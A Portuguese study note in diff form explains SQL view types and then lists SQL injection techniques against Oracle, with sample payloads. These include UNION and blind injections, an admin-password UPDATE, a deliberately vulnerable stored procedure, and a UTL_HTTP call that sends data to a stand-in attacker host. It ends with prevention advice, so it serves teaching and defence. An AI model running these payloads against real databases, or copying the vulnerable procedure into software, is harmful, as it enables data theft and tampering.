@@ -1,0 +1,291 @@
+No SQL, **views** (ou **visões**) são objetos virtuais que armazenam consultas. Elas não armazenam dados propriamente, mas sim uma definição de como os dados devem ser apresentados a partir de tabelas ou outras views. Existem diferentes tipos de views, dependendo do sistema de banco de dados e da funcionalidade desejada.
+
+---
+
+### **Tipos de Views no SQL**  
+
+#### 1. **Views Simples**  
+São baseadas em uma única tabela e geralmente usadas para simplificar a exibição de dados.  
+
+- **Características:**  
+  - Contêm colunas de uma única tabela.  
+  - Não possuem agregações nem joins complexos.  
+  - São fáceis de atualizar (dependendo do banco).  
+
+- **Exemplo:**  
+  ```sql
+  CREATE VIEW vw_clientes_ativos AS
+  SELECT id, nome, email
+  FROM clientes
+  WHERE status = 'ativo';
+  ```
+
+---
+
+#### 2. **Views Complexas**  
+Baseiam-se em múltiplas tabelas e/ou incluem funções, joins e agregações.  
+
+- **Características:**  
+  - Difíceis ou impossíveis de atualizar diretamente.  
+  - Ideais para relatórios ou visualizações específicas.  
+
+- **Exemplo:**  
+  ```sql
+  CREATE VIEW vw_vendas_por_cliente AS
+  SELECT c.nome, SUM(v.valor) AS total_vendas
+  FROM clientes c
+  JOIN vendas v ON c.id = v.cliente_id
+  GROUP BY c.nome;
+  ```
+
+---
+
+#### 3. **Views Materializadas** (ou Materialized Views)  
+Armazenam os resultados da consulta no disco, oferecendo melhorias de desempenho.
+Ou seja teremos fisicamente os dados de onde a gente buscou pela primeira vez e ai sempre que precisa atualizar, precisamos rodar a atualização
+
+- **Características:**  
+  - São persistentes no banco de dados.  
+  - Precisam ser atualizadas manualmente ou em intervalos programados.  
+  - Comuns em bancos como Oracle e PostgreSQL.  
+
+- **Exemplo (Oracle):**  
+  ```sql
+  CREATE MATERIALIZED VIEW mv_vendas_diarias
+  BUILD IMMEDIATE
+  REFRESH FAST ON COMMIT
+  AS
+  SELECT cliente_id, SUM(valor) AS total_vendas, TRUNC(data_venda) AS dia
+  FROM vendas
+  GROUP BY cliente_id, TRUNC(data_venda);
+  ```
+
+---
+
+#### 4. **Views Indexadas**  
+Utilizam índices associados à view para melhorar o desempenho de consultas.  
+
+- **Características:**  
+  - Não suportadas por todos os bancos de dados.  
+  - Permitem consultas mais rápidas com grandes volumes de dados.  
+
+- **Exemplo (SQL Server com Indexed View):**  
+  ```sql
+  CREATE VIEW vw_vendas_indexadas WITH SCHEMABINDING AS
+  SELECT cliente_id, COUNT(*) AS total_vendas
+  FROM vendas
+  GROUP BY cliente_id;
+
+  CREATE UNIQUE CLUSTERED INDEX idx_vendas_indexadas
+  ON vw_vendas_indexadas(cliente_id);
+  ```
+
+---
+
+#### 5. **Views Temporárias**  
+Existem apenas durante a sessão do usuário ou transação.  
+
+- **Características:**  
+  - Não persistem no banco.  
+  - Comuns para cálculos ou manipulações temporárias.  
+
+- **Exemplo:**  
+  ```sql
+  CREATE TEMPORARY VIEW temp_clientes_novos AS
+  SELECT * 
+  FROM clientes
+  WHERE data_cadastro > SYSDATE - 30;
+  ```
+
+---
+
+#### 6. **Views com Check Option**  
+Restringem atualizações ou inserções que violam a definição da view.  
+
+- **Características:**  
+  - Garantem que os dados inseridos ou atualizados respeitem as condições da view.  
+
+- **Exemplo:**  
+  ```sql
+  CREATE VIEW vw_clientes_ativos AS
+  SELECT * FROM clientes WHERE status = 'ativo'
+  WITH CHECK OPTION;
+  ```
+
+---
+
+#### 7. **Views de Segurança**  
+Escondem informações sensíveis ou desnecessárias, permitindo acesso controlado aos dados.  
+
+- **Características:**  
+  - Utilizadas para implementar políticas de segurança e permissões.  
+
+- **Exemplo:**  
+  ```sql
+  CREATE VIEW vw_clientes_publico AS
+  SELECT id, nome
+  FROM clientes;
+  ```
+
+---
+
+### **Quando Usar Cada Tipo de View?**  
+- **Simples:** Para abstrair consultas frequentes e simplificar acesso a dados.  
+- **Complexas:** Para relatórios ou combinações sofisticadas de dados.  
+- **Materializadas:** Para otimizar consultas em grandes volumes de dados.  
+- **Indexadas:** Para acelerar consultas específicas em sistemas compatíveis.  
+- **Temporárias:** Para cálculos ou manipulações pontuais.  
+- **Com Check Option:** Quando a consistência das condições da view é essencial.  
+- **De Segurança:** Para fornecer acesso restrito ou anonimizado a dados.  
+
+--- 
+
+Views são ferramentas poderosas para estruturar, simplificar e otimizar o acesso aos dados. A escolha do tipo depende da necessidade da aplicação e do ambiente do banco de dados.
+
+
+<br>
+<br>
+<br>
+<br>
+
+
+# ***SQL INJECTION***
+### **Técnicas de Exploração de SQL Injection em Oracle**  
+
+#### **1. Comentários para Ignorar o Código Restante**  
+Essa técnica aproveita o uso de comentários para alterar a lógica da consulta SQL, ignorando partes restantes do comando.  
+
+- **Entrada maliciosa:**  
+  ```sql
+  ' OR '1'='1' --  
+  ```
+- **Resultado:**  
+  ```sql
+  SELECT * FROM usuarios WHERE usuario = '' OR '1'='1' --;
+  ```
+  O restante da query é comentado (`--`), garantindo que a condição maliciosa sempre seja verdadeira.  
+
+---
+
+#### **2. Exploração Boolean-Based (Blind SQL Injection)**  
+Aqui, os atacantes inferem dados com base em respostas verdadeiras ou falsas do sistema.  
+
+- **Exemplo de entrada:**  
+  ```sql
+  ' OR (SELECT CASE WHEN LENGTH(usuario) > 5 THEN 1 ELSE 0 END FROM dual) = 1 --
+  ```
+- **Comportamento:**  
+  A resposta (verdadeiro/falso) indica se a condição foi atendida, permitindo descobrir características como o tamanho ou valores das colunas.
+
+---
+
+#### **3. UNION-Based SQL Injection**  
+Essa técnica combina resultados de tabelas existentes com a consulta original por meio do operador `UNION`.  
+
+- **Entrada maliciosa:**  
+  ```sql
+  ' UNION SELECT null, nome, senha FROM usuarios --
+  ```
+- **Resultado:**  
+  ```sql
+  SELECT * FROM usuarios WHERE usuario = '' UNION SELECT null, nome, senha FROM usuarios;
+  ```
+
+---
+
+#### **4. Time-Based (Blind SQL Injection)**  
+Nesse método, o atacante usa funções que introduzem atrasos (como `DBMS_LOCK.SLEEP`) para inferir informações, mesmo sem feedback direto.  
+
+- **Exemplo de entrada:**  
+  ```sql
+  ' OR 1=1 AND DBMS_LOCK.SLEEP(5) --
+  ```
+- **Comportamento:**  
+  Se a query demora para ser executada, indica que a condição foi verdadeira.
+
+---
+
+#### **5. Error-Based SQL Injection**  
+Erros gerados pelo banco são usados para obter informações sensíveis, como nome de tabelas e colunas.  
+
+- **Exemplo de entrada:**  
+  ```sql
+  ' || (SELECT 1/0 FROM dual) --
+  ```
+- **Comportamento:**  
+  O erro retornado pelo banco pode revelar detalhes sobre a consulta e a estrutura da base de dados.  
+
+---
+
+#### **6. Injeção em Procedimentos Armazenados (Stored Procedures)**  
+Procedimentos armazenados vulneráveis podem ser explorados de forma semelhante a queries normais.  
+
+- **Exemplo:**  
+  ```sql
+  CREATE OR REPLACE PROCEDURE consultar_usuario(p_usuario IN VARCHAR2) AS
+  BEGIN
+      EXECUTE IMMEDIATE 'SELECT * FROM usuarios WHERE usuario = ''' || p_usuario || '''';
+  END;
+  ```
+  Entrada maliciosa:  
+  ```sql
+  ' OR '1'='1' --
+  ```
+
+---
+
+#### **7. Exfiltração de Dados do Sistema Oracle**  
+Exploração de tabelas do sistema para listar informações de metadados.  
+
+- **Exemplo de entrada:**  
+  ```sql
+  ' UNION SELECT table_name, column_name FROM all_tab_columns WHERE table_name = 'USUARIOS' --
+  ```
+- **Uso comum:**  
+  Identificar tabelas e colunas sensíveis para outros ataques.  
+
+---
+
+#### **8. SQL Injection com Funções Oracle**  
+Funções específicas do Oracle, como `UTL_HTTP`, podem ser usadas para envio de dados para servidores externos.  
+
+- **Exemplo de entrada:**  
+  ```sql
+  ' || UTL_HTTP.REQUEST('http://atacante.com?dados=' || nome) --
+  ```
+
+---
+
+#### **9. Subqueries Maliciosas**  
+Subqueries podem ser usadas para acessar dados que não fazem parte da consulta original.  
+
+- **Exemplo de entrada:**  
+  ```sql
+  ' OR (SELECT senha FROM usuarios WHERE nome = 'admin') = 'senha_secreta' --
+  ```
+
+---
+
+#### **10. Manipulação de Dados (Data Tampering)**  
+Além de obter dados, o atacante pode usar SQL Injection para modificar ou excluir registros.  
+
+- **Exemplo de entrada:**  
+  ```sql
+  '; UPDATE usuarios SET senha = 'nova_senha' WHERE nome = 'admin' --
+  ```
+- **Resultado:**  
+  Modifica os dados do administrador para a nova senha fornecida.  
+
+---
+
+### **Prevenção**  
+Para evitar essas técnicas, implemente práticas seguras:  
+
+1. **Uso de Bind Variables:**  
+   ```sql
+   EXECUTE IMMEDIATE 'SELECT * FROM usuarios WHERE nome = :nome' USING :nome;
+   ```
+2. **Validação de Entrada:** Rejeite caracteres inesperados (`'`, `--`, `;`, etc.).  
+3. **Menor Privilégio:** Evite que aplicações acessem objetos do sistema ou façam alterações desnecessárias.  
+4. **Monitoramento de Logs:** Detecte tentativas de manipulação.  
+5. **Ferramentas de Segurança:** Scanners e WAF ajudam a identificar e bloquear vulnerabilidades.
